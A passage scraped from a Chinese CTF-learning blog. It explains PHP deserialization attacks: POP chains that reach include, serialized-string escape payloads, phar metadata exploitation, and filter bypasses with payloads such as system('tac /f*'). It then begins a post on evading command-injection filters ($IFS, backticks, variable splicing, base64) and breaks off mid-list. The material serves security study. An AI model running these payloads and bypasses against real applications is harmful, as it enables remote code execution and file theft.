class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
链子写法不一定相同,写出两种比较常见的写法<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pop</span>=<span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="comment">//实例化一个show,会触发__construct(起点)</span></span><br><span class="line"><span class="variable">$pop</span>-&gt;source=<span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="comment">//把第一个show的source属性实例化成show对象,这时候属性是一个对象,如果把这个show对象当做字符串,会触发show类中的__toString</span></span><br><span class="line"><span class="variable">$pop</span>-&gt;source-&gt;str=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="comment">//把第二个show中的str属性实例化成Test对象,这时候toSting中调用了str-&gt;source,因为在Test对象中调用了不存在的属性,会触发Test类中的__get</span></span><br><span class="line"><span class="variable">$pop</span>-&gt;source-&gt;str-&gt;p=<span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="comment">//把第三个Test类中的p属性实例化成Modifier对象,这时候__get中把属性p当做函数使用,属性p是Modifier对象,这时候会触发Modifier类中的__invoke(终点危险函数include)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pop</span>));  <span class="comment">//url编码防止有不可见字符&lt;0x00&gt;</span></span><br><span class="line"><span class="comment">//记得将Modifier类中$var属性赋值,因为序列化时会保留成员属性的值,所有直接写在类中就行</span></span><br></pre></td></tr></table></figure>
一样的意思,感觉哪个舒服写哪个<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$one</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$oneone</span>=<span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$two</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$three</span> = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$one</span>-&gt;source=<span class="variable">$oneone</span>;</span><br><span class="line"><span class="variable">$oneone</span>-&gt;str=<span class="variable">$two</span>;</span><br><span class="line"><span class="variable">$two</span>-&gt;p=<span class="variable">$three</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pop</span>));</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h3><p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/165222.html">大佬讲解</a></p>
<ol>
<li><p><strong>什么情况下会产生反序列化逃逸</strong><br>如果开发人员先将用户输入的数据序列化后,再进行过滤或替换,最后再进行反序列化,这样的处理流程可能产生反序列化逃逸<br><code>serialize</code> -&gt; <code>filter</code> -&gt; <code>unserialize</code></p>
</li>
<li><p><strong>原理</strong><br>关键字符在序列化后被过滤替换掉了,但序列化时,会记录字符长度，这个长度是不会变的,在读取字符时,仍会按照原来的长度进行读取.如果过滤后变短了,则会向后读取字符,如果替换后变长了,则会提前终止读取<br>同时反序列化还有一个问题,如果遇到了<code>&#125;</code>就会认为已经结束,后面的字符就会被丢弃<br>可以结合两个特点,控制读取的内容从而达到控制键值对,破坏掉原来的结构,从而实现反序列化逃逸</p>
</li>
<li><p><strong>payload构造</strong><br><code>$_SESSION[&#39;flagphp&#39;]=&#39;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#39;</code><br>如果将这段代码序列化后得到<br><code>a:1:&#123;s:7:&quot;flagphp&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;</code><br>原本效果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [flagphp] =&gt;;<span class="attr">s</span>:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;<span class="attr">s</span>:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;<span class="attr">s</span>:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>如果过滤了flag和php得到<br><code>a:1:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;</code><br>最后效果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="string">&quot;;s:48:] =&gt;1</span></span><br><span class="line"><span class="string">    [img] =&gt; ZDBnM19mMWFnLnBocA==</span></span><br><span class="line"><span class="string">)</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="phar反序列化漏洞"><a href="#phar反序列化漏洞" class="headerlink" title="phar反序列化漏洞"></a>phar反序列化漏洞</h3><ol>
<li><p><strong>什么是phar</strong><br>Phar文件是 PHP 中的一种打包压缩文件，类似于Java中的JAR包。它可以将多个PHP文件打包成一个文件，方便应用程序的打包和组件化。<br>Phar 文件由四个部分组成：</p>
<ol>
<li><strong>Stub</strong>，它可以被解释为一个标记，格式为 <code>xxx&lt;?php xxx; __HALT_COMPILER ();?&gt;</code>。前面的内容不受限制，但必须以<code> __HALT_COMPILER ();?&gt;</code> 结尾，否则phar扩展将无法识别该文件为phar文件；</li>
<li><strong>文件清单Manifest</strong>，描述了文件的内容,这里面有个关键概念元数据,元数据(<strong>meta-data</strong>)manifest中的用户自定义数据,它可以包含任意类型的序列化数据，用于存储有关Phar文件的额外信息。当使用<code>phar://</code>伪协议读取phar文件时，元数据会被反序列化，这就是phar反序列化漏洞的成因。</li>
<li><strong>文件内容file contents</strong>,包含了被压缩的文件内容</li>
<li><strong>签名signature</strong>（可选），用于验证 Phar 文件的完整性1。</li>
</ol>
</li>
<li><p><strong>漏洞利用条件</strong><br>什么样的情况下我们会考虑这个漏洞</p>
<ol>
<li>代码本身就存在反序列化漏洞,但是没有<code>unserialize()</code>反序列化函数,可以用这种方式进行反序列化创建对象(实际上这个文件的利用就是为了代替反序列化函数)</li>
<li>使用了文件系统函数（如<code>file_exists()</code>、<code>is_dir()</code>,<code>file_get_contents()</code>，<code>file()</code>,<code>unlink</code>等）且参数可控(参数即为phar文件)，且没有对<code>phar://</code>伪协议进行过滤(这些函数在处理phar文件时,都会触发反序列化)</li>
<li>网站有文件上传的功能,并且只是识别后缀,我们可以上传phar文件,将后缀改成图片.因为使用 PHP 伪协议（例如 phar:&#x2F;&#x2F;）访问一个文件时，PHP 只检查文件的内容而不是文件扩展名来确定它是否为一个有效的 phar 文件。</li>
</ol>
</li>
<li><p><strong>流程</strong></p>
<ol>
<li>先构造pop链,或是其他序列化的字符串,将内容写入phar文件</li>
<li>上传phar文件,并获得文件地址</li>
<li>使用伪协议<code>phar://+文件地址</code>访问,这时候,就会将内容进行反序列化了</li>
</ol>
</li>
<li><p><strong>代码以及代码解释</strong><br>运行下面这段代码,将会生成一个phar文件,这个生成的文件就是我们要上传的文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//文件名，后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();  <span class="comment">//开始缓冲，这意味着对 Phar 文件的修改不会立即写入磁盘</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$pop</span>); <span class="comment">//传入pop链或者序列化字符串,会将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();    </span><br></pre></td></tr></table></figure>
<p>下面是对这段代码每一行的详细解释：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);</span><br><span class="line"><span class="comment">//使用 PHP 的 Phar 类,创建一个 Phar 对象，用于操作名为 test.phar 的 Phar 文件。</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="comment">//开始缓冲，这意味着对 Phar 文件的修改不会立即写入磁盘</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="comment">//设置 Phar 文件的 stub。stub 是 Phar 文件中的一段代码，它在 Phar 文件被包含或执行时首先运行。在这个例子中，stub 只包含一个 __HALT_COMPILER() 函数调用，它告诉 PHP 解释器停止编译。</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$pop</span>);</span><br><span class="line"><span class="comment">//将 $pop 设置 Phar 文件的元数据。元数据是一个任意的序列化变量，它存储在 Phar 文件的 manifest 中。在这个例子中，元数据被设置为变量 $pop 的值。</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="comment">//向 Phar 文件中添加一个文件。这个方法接受两个参数：文件名和文件内容。在这个例子中，我们向 Phar 文件中添加了一个名为 test.txt 的文件，它的内容为字符串 &quot;test&quot;。</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="comment">//停止缓冲并将修改写入磁盘。这一行代码会将前面对 Phar 文件所做的修改一次性写入磁盘。</span></span><br></pre></td></tr></table></figure>
<p>总之，这段代码创建了一个名为 test.phar 的 Phar 文件，并向其中添加了一个文件和一些元数据</p>
</li>
<li><p><strong>注意点</strong><br>要想使用上面的代码创建phar文件,必须要在php.ini中进行设置,否则会报错<br>我用的是PHPstorm和小皮的环境,生成的文件会在<code>phpstudy_pro\WWW</code>目录下<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230429195822.png" alt="AI的回答"></p>
</li>
</ol>
<h3 id="16进制绕过"><a href="#16进制绕过" class="headerlink" title="16进制绕过"></a>16进制绕过</h3><ol>
<li><strong>切入点</strong><br>当代码中存在关键词检测时，将表示字符类型的小写<code>s</code>改为大写<code>S</code>来绕过检测,原理是,序列化字符串中表示字符类型的S为大写时，字符串遇到<code>\+16进制数</code>就会解析<br>例如<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;you are&#x27;</span>.<span class="variable language_">$this</span>-&gt;username.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username == <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/username/&#x27;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;nonono!!!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 未作处理前，会被waf拦截</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//将小s改为大S; 做处理后 \75是u的16进制</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
输出结果<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nonono!!!  //第一个被waf拦截</span><br><span class="line">you are admin   //成功绕过</span><br><span class="line">success</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="原生类-内置类-的利用"><a href="#原生类-内置类-的利用" class="headerlink" title="原生类(内置类)的利用"></a>原生类(内置类)的利用</h3><ol>
<li><p><strong>什么是原生类</strong><br>原生类就是php中内置的类,简单可以理解为,PHP语言帮你定义好了这个类的全部,我们不需要定义写出也能直接实例化<br>原生类和普通类本质上没什么不同,都是由属性和方法(魔术方法)组成,比如之前的Phar也是php的一种原生类<br>原生类是为了帮助开发人员更快的实现一些功能,但是有时候某些原生类处理不当也会带来一些安全问题,这里先介绍几个ctf中比较常见的原生类</p>
</li>
<li><p><strong>Exception类与Error类</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">适用版本</span><br><span class="line">Error：用于PHP7、8。</span><br><span class="line">Exceotion：用于PHP5、7、8</span><br></pre></td></tr></table></figure>
<p>这两个原生类没有很大区别,Error类和Exception类都继承自Throwable接口。两个类都可以用来处理错误和异常情况，但它们的用途不同。Error类表示严重的错误，通常无法恢复，而Exception类表示可以恢复的异常.<br>我们主要利用这两个类中的<code>__tostring</code>魔术方法来构造一些内容去绕过一些比较,或是构造XSS<br><strong>类中的哈希绕过:</strong><br><code>if(($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)))</code><br>由之前的学习可以知道echo一个对象时,由于对象被当成了字符串,会触发<code>__tostring</code>魔术方法,因为函数<code>md5()</code>和<code>sha1()</code>期望接受到的是字符串,所以也会触发<code>__tostring</code><br>因为我们创建的对象不同,但是<code>__tostring</code>返回的内容相同,所以我们可以利用这个来绕过上面的哈希比较<br>例如</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SYCLOVER</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>)));</span><br></pre></td></tr></table></figure>
<p>需要注意的是,两个错误类实例化必须要在同一行,因为tostring返回的代码包括了行数<br>解释一下这段代码,<code>$str</code>的内容作为异常信息,异常信息会被tostring返回,所以我们可以控制其中的内容,数字1和2是错误代码,来表示异常的类型或原因,不会被tostring返回<br><code>?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;</code>这段代码是为了配合命令执行漏洞使用,<code>?&gt;</code>是为了实现前面错误信息的闭合,后面可以写入完整的我们想要实现的代码</p>
</li>
</ol>
<h3 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h3><p>如果后端对输入的数据先进行了一些正则匹配的过滤,我们也可以试着采取一些绕过手法</p>
<ol>
<li><p><strong>利用+绕过O</strong><br><code>preg_match(&#39;/^O:\d+/i&#39;,$data)</code>这个正则表达式<code>&#39;/^O:\d+/i&#39;</code>匹配以大写字母O开头，后面紧跟一个或多个数字的字符串<br>如果后端利用这个正则来确保用户输入的不是一个序列化的对象,我们可以使用加号<code>+</code>绕过<br>类似于   O:**+*<em>4:”Test”:1:{s:4:”name”;s:18:”system(‘tac &#x2F;f</em>‘);”;}<br>需要注意的是在url里传参时<code>+</code>要编码为<code>%2B</code>,要不然<code>+</code>会被识别成空格</p>
</li>
<li><p><strong>利用数组绕过O</strong><br>还是适用于前面那种情况,不过把对象放在一个数组中来避免来以O开头</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;system(&#x27;tac /f*&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//结果 a:1:&#123;i:0;O:4:&quot;Test&quot;:1:&#123;s:4:&quot;name&quot;;s:18:&quot;system(&#x27;tac /f*&#x27;);&quot;;&#125;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>匹配}</strong><br><code>preg_match(&#39;/\&#125;$/&#39;,$data)</code>匹配以大括号<code>&#125;</code>结尾的字符串<br>绕过原理 反序列化字符串末尾所有的<code>&#125;</code>是全部可以删掉的，甚至可以末尾填充字符,反序列化时没有影响</p>
</li>
</ol>
<h3 id="不可见字符绕过-类属性不敏感"><a href="#不可见字符绕过-类属性不敏感" class="headerlink" title="不可见字符绕过(类属性不敏感)"></a>不可见字符绕过(类属性不敏感)</h3><p>对此相当无语,如果对输入进行了过滤,过滤了不可见字符,也就意味着<code>&lt;0x00&gt;</code>也是被过滤的,如果类中有受保护或者私有属性,序列化不可避免的会有<code>&lt;0x00&gt;</code>这时候试着将属性的类型改成<code>public</code>再进行实例化<br>因为PHP7.1+对类的属性类型不敏感,你传进去<code>public</code>代替其他两种也没事,这个没有不可见字符</p>
<h3 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h3>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/16/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hearder.jpg">
      <meta itemprop="name" content="？？喵！！">
      <meta itemprop="description" content="瞄一下学过代码，写一个睡喵的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="睡猫的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/16/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/" class="post-title-link" itemprop="url">命令执行的绕过技巧</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-04-16 20:51:19" itemprop="dateCreated datePublished" datetime="2023-04-16T20:51:19+08:00">2023-04-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-05-04 20:23:01" itemprop="dateModified" datetime="2023-05-04T20:23:01+08:00">2023-05-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Hacker/" itemprop="url" rel="index"><span itemprop="name">Hacker</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>5.2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>19 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>想要进行绕过的话,需要根据不同的系统的特性采用不同的方式,在ctf中还是以Linux居多</p>
<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>Shell 是一个用 C 语言编写的程序，它是用户使用 Linux 的桥梁。Shell 既是一种命令语言，又是一种程序设计语言,Shell是系统的用户界面，提供了用户与内核进行交互操作的一种接口(命令解释器)</p>
<p>sh(全称 Bourne Shell): 是UNIX最初使用的 shell，而且在每种 UNIX 上都可以使用。Bourne Shell 在 shell 编程方面相当优秀，但在处理与用户的交互方面做得不如其他几种 shell。</p>
<p>bash（全称 Bourne Again Shell）: LinuxOS 默认的，它是 Bourne Shell 的扩展。与BourneShell 完全兼容，并且在 Bourne Shell 的基础上增加了很多特性。可以提供命令补全，命令编辑和命令历史等功能。它还包含了很多 C Shell 和 Korn Shell 中的优点，有灵活和强大的编辑接口，同时又很友好的用户界面。<br>我们常用(默认)的就是bash(bourne again shell)</p>
<h2 id="shell变量"><a href="#shell变量" class="headerlink" title="shell变量"></a>shell变量</h2><p>先来介绍一个概念叫做shell变量,shell变量是由shell程序设置的特殊变量,定义变量时，变量名不加美元符号<code>$</code>,使用变量时,需要加上美元符号<br>变量名外面的花括号是可选的.加花括号是为了帮助解释器识别变量的边界,如${IFS}</p>
<h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><ol>
<li><strong>IFS绕过</strong><br>原理:<code>$IFS</code>(Internal Filed Separator)内部域分隔符,是一个shell变量，默认是空格、Tab键、换行符,可以代替空格使用<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$IFS   //这个一般用不了,因为空格过滤了的情况下,无法区分边界  </span><br><span class="line">$&#123;IFS&#125;   //花括号&#123;&#125;用于区分边界</span><br><span class="line">$IFS$1 //后面一个变量用于区分边界,$1改成$加其他数字貌似都行</span><br></pre></td></tr></table></figure></li>
<li><strong>其他绕过</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;   // cmd&lt;file 使cmd命令从file读入,cat的时候可以代替空格</span><br><span class="line">&lt;&gt;  // cmd&lt;&gt;file 以读写模式把文件file重定向到输入,cat的时候可以代替空格</span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="关键词绕过"><a href="#关键词绕过" class="headerlink" title="关键词绕过"></a>关键词绕过</h2><h3 id="内联执行-反引号"><a href="#内联执行-反引号" class="headerlink" title="内联执行(反引号)"></a>内联执行(反引号)</h3><ol>
<li><strong>原理</strong><br>此处的反引号是Linux命令里的反引号,和php危险函数里的不同,效果却差不多<br>反引号的功能是命令替换，在反引号(``)中的内容通常是可执行的命令，程序会优先执行反引号中的内容，并使用运行结果替换掉反引号处的内容。<br>例如:<strong>cat `ls`</strong>,会先执行ls查询,再将所有文件进行一个cat</li>
</ol>
<h2 id="变量替换"><a href="#变量替换" class="headerlink" title="变量替换"></a>变量替换</h2><ol>
<li><strong>原理</strong><br>这里的变量是shell变量,不是php的变量,利用命令的拼接,变量的拼接,达到关键词被替换的效果<br>例如:<code>a=g;cat fla$a.php</code> 或是<code>a=fl;b=ag;cat $a$b.php</code> &#x2F;&#x2F;变量定义的时候不加$,使用的时候加</li>
<li><strong>注意</strong><br>需要稍微注意的是,命令之间的连接符不能用<code>||</code>,因为一旦前面的命令为真后,后面的命令不再执行</li>
</ol>
<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><ol>
<li><strong>原理</strong><br>利用Linux里的<code>base64</code>命令,可以进行base64的编码(<code>base64 -d</code>代表解码),先将关键字编码好,再利用管道符和<code>base64 -d</code>进行解码实现对关键字的绕过</li>
<li><strong>先讲编码</strong><br><code>echo  待编码字符 |base64</code> 或<code>base64 &lt;&lt;&lt; &quot;待编码字符”</code></li>
